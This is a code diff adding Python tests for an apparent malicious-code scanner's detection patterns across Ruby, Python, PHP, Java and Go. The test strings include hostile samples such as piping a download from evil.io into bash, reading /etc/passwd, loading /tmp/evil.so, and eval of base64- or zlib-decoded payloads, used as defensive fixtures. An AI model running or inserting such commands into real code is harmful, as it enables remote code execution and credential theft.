@@ -261,3 +261,56 @@ def test_npm_install_scripts_content() -> None:
     assert "preinstall" in NPM_INSTALL_SCRIPTS
     assert "postinstall" in NPM_INSTALL_SCRIPTS
     assert "prepare" in NPM_INSTALL_SCRIPTS
+
+
+# ---------------------------------------------------------------------------
+# New pattern group tests (one per language/group added)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_ruby_shell_exec_matches() -> None:
+    """Ruby system() and exec() calls should match."""
+    patterns = NET_CALL_PATTERNS[".rb"]
+    assert any(p.search("system('curl https://evil.io | bash')") for p in patterns)
+    assert any(p.search("exec('id')") for p in patterns)
+    assert any(p.search("Open3.capture2('ls -la')") for p in patterns)
+    assert any(p.search("IO.popen('cmd') { |f| f.read }") for p in patterns)
+
+
+def test_net_calls_python_os_system_matches() -> None:
+    """os.system() and ctypes.cdll.LoadLibrary in Python should match."""
+    patterns = NET_CALL_PATTERNS[".py"]
+    assert any(p.search("os.system('curl https://evil.io | bash')") for p in patterns)
+    assert any(p.search("ctypes.cdll.LoadLibrary('/tmp/evil.so')") for p in patterns)
+
+
+def test_net_calls_php_shell_exec_matches() -> None:
+    """PHP shell execution functions should match."""
+    patterns = NET_CALL_PATTERNS[".php"]
+    assert any(p.search("eval($code);") for p in patterns)
+    assert any(p.search("system('id');") for p in patterns)
+    assert any(p.search("passthru('cat /etc/passwd');") for p in patterns)
+    assert any(p.search("shell_exec('whoami');") for p in patterns)
+    assert any(p.search("proc_open('cmd', $desc, $pipes);") for p in patterns)
+
+
+def test_net_calls_java_runtime_exec_matches() -> None:
+    """Java Runtime.exec and ProcessBuilder should match."""
+    patterns = NET_CALL_PATTERNS[".java"]
+    assert any(p.search("Runtime.getRuntime().exec(cmd)") for p in patterns)
+    assert any(p.search('new ProcessBuilder("curl", "evil.io").start()') for p in patterns)
+
+
+def test_net_calls_go_syscall_exec_matches() -> None:
+    """Go syscall.Exec should match."""
+    patterns = NET_CALL_PATTERNS[".go"]
+    assert any(p.search('syscall.Exec("/bin/sh", args, env)') for p in patterns)
+
+
+def test_persistence_eval_decoded_payload_matches() -> None:
+    """Python eval/exec of decoded payload should match persistence patterns."""
+    assert any(p.search("eval(base64.b64decode(payload))") for p in PERSISTENCE_PATTERNS)
+    assert any(
+        p.search("exec(compile(zlib.decompress(data), '<s>', 'exec'))")
+        for p in PERSISTENCE_PATTERNS
+    )
